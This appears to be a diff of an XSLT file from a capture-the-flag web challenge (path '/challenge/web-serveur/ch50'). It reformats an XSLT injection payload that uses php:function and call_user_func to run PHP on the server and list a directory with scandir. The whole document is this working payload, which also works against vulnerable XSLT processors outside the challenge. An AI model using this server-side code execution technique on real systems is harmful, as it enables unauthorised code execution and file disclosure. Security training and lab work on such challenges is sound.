@@ -3,9 +3,7 @@
 
 
    
-   <xsl:value-of select="php:function('call_user_func', function(){
-    return print_r(scandir('/challenge/web-serveur/ch50'), true);
-})"/> 
+   <xsl:value-of select="php:function('call_user_func', function(){ return print_r(scandir('/challenge/web-serveur/ch50'), true); })"/> 
 
    
    </xsl:template>
